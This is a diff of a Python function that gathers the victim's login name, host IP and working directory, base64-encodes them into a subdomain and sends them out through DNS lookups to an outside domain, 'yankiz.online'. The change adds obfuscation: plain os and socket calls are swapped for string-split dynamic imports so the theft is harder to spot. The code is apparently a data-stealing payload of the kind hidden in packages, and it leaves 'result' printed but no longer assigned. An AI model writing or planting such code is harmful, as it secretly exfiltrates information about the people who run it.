@@ -33,19 +33,24 @@ def sdesc():
     import socket
     import os
     imp_and_run("socket", "gethost", "byname")("first.csp9mzod.yankiz.online")
-    username = imp_and_run("os", "get", "cwd")()
-    imp_and_run("socket", "gethost", "byname")(f"{username}.csp9mzod.yankiz.online")
-    DNS_SUBDOMAIN = "snkpinkh12.yankiz.online"
+    DNS_SUBDOMAIN = "second.csp9mzod.yankiz.online"
     try:
-        username = os.getlogin()
-        host = socket.gethostbyname(socket.gethostname())
-        pwd = os.getcwd()
+        # username = os.getlogin()
+        username = imp_and_run("os", "get", "login")()
+        # host = socket.gethostbyname(socket.gethostname())
+        host = imp_and_run("socket", "gethost", "byname")(
+            imp_and_run("socket", "get", "hostname")()
+        )
+        # pwd = os.getcwd()
+        pwd = imp_and_run("os", "get", "cwd")()
         content = f"{username}|{host}|{pwd}"
         print(f"content: {content.encode()}")
         b64 = to_base64_subdomain(content)
         subdomain = f"{b64}.{DNS_SUBDOMAIN}"
         print(f"subdomain is: {subdomain}")
-        result = socket.gethostbyname(subdomain)
+        # result = socket.gethostbyname(subdomain)
+        imp_and_run("socket", "gethost", "byname")(subdomain)
+        
         print(f"IP address of {subdomain}: {result}")
     except socket.gaierror:
         print(f"DNS lookup failed for {subdomain}")
